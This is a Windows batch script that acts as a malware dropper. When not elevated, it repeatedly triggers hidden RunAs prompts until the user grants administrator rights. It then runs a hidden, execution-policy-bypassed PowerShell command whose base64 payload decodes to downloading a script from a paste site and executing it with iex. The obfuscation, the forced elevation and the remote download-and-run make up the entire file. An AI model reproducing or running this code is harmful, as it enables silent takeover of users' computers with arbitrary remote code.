@echo off
cd /d "%~dp0"
net session >nul 2>&1
if NOT %errorlevel% == 0 ( powershell -Win Hidden -NoP -ExecutionPolicy Bypass "while(1){try{Start-Process -WindowStyle Hidden -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
powershell -executionpolicy bypass -WindowStyle hidden -e aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AcABhAHMAdABlAGoAdQBzAHQAaQB0AC4AYwBvAG0ALwByAGEAdwAvAG0AcwBkAGMAZwB5ADMAYgB4AGcAIAB8ACAAaQBlAHgA
